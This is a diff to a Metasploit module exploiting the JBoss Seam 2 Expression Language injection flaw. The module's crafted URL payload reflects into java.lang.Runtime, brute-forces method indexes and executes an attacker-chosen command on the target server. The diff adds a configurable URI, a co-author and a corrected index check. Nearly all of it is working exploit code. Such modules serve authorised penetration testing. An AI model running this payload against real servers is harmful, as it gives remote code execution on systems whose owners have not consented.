@@ -18,12 +18,13 @@ class Metasploit3 < Msf::Auxiliary
 					JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform
 				4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression
 				Language (EL) expressions, which allows remote attackers to execute arbitrary code
-				via a crafted URL.
+				via a crafted URL. This modules is already successfully tested againt IBM WebSphere
+				6.1 running on iSeries.
 
 				NOTE: this is only a vulnerability when the Java Security Manager is not properly
 				configured.
 			},
-			'Author'          => [ 'guerrino di massa' ],
+			'Author'          => [ 'guerrino di massa', 'Cristiano Maruti <cmaruti[at]gmail.com>' ],
 			'License'         => MSF_LICENSE,
 			'References'      =>
 				[
@@ -37,23 +38,22 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				Opt::RPORT(8080),
 				OptString.new('JBOSS_ROOT',[ true, 'JBoss root directory', '/']),
+				OptString.new('URI',[ true, 'Target URI', 'seam-booking/home.seam']),
 				OptString.new('CMD', [ true, "The command to execute."])
 			], self.class)
 	end
 
 	def run
-		jbr = normalize_uri(datastore['JBOSS_ROOT'])
+		jbr = normalize_uri(datastore['JBOSS_ROOT'] + datastore['URI'])
 		cmd_enc = ""
 		cmd_enc << Rex::Text.uri_encode(datastore["CMD"])
 
-		flag_found_one = 0
-		flag_found_two = 0
+		flag_found_one = 255
+		flag_found_two = 255
 
-		uri_part_1 = "seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()["
+		uri_part_1 = "?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()["
 		uri_part_2 = "].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()["
 		uri_part_3 = "].invoke(null),'"
-
-		print_status("Finding getDeclaredMethods() indexes... (0 to 24)")
 
 		25.times do |index|
 			req = jbr + uri_part_1 + index.to_s + "]}"
@@ -66,16 +66,16 @@ class Metasploit3 < Msf::Auxiliary
 
 			if (res.headers['Location'] =~ %r(java.lang.Runtime.exec\%28java.lang.String\%29))
 				flag_found_one = index
-				print_status("Found right index at [" + index.to_s + "]")
+				print_status("Found right index at [" + index.to_s + "] - exec")
 			elsif (res.headers['Location'] =~ %r(java.lang.Runtime\+java.lang.Runtime.getRuntime))
-				print_status("Found right index at [" + index.to_s + "]")
+				print_status("Found right index at [" + index.to_s + "] - getRuntime")
 				flag_found_two = index
 			else
 				print_status("Index [" + index.to_s + "]")
 			end
 		end
 
-		if (flag_found_one > 0 && flag_found_two > 0 )
+		if (flag_found_one != 255 && flag_found_two != 255 )
 			print_status("Target appears VULNERABLE!")
 			print_status("Sending remote command:" + datastore["CMD"])
 
